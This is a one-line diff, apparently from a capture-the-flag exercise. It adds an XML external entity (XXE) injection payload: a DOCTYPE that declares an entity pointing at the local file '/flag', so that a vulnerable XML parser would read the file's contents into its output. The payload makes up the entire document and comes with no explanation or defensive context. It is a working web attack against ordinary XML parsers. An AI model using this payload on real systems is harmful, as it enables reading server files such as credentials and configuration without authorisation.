@@ -1,0 +1,1 @@
+<!DOCTYPE title [ <!ELEMENT title ANY ><!ENTITY xxe SYSTEM "file:/flag" >]>
